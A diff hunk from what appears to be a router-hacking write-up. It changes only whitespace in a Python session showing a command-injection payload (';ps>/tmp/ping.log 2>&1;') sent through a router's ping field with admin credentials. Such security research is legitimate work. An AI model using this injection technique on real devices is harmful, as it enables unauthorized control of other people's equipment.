@@ -296,10 +296,10 @@ I opened my disassembler and looked for strings that contain a `/` indicating a 
 That's it! `/tmp/ping.log` must be the one. Let's test it.
 ```py
 In [1]: r = Router('192.169.1.1', ('admin', 'waddup'))
-                                                      
-In [2]: r._run_shell_cmd('ps', with_output=True)      
-[*] Running: ;ps>/tmp/ping.log 2>&1;                  
-[*] Issuing a firmware upgrade.                       
+
+In [2]: r._run_shell_cmd('ps', with_output=True)
+[*] Running: ;ps>/tmp/ping.log 2>&1;
+[*] Issuing a firmware upgrade.
 ```
 ![Ping Log Output]
 
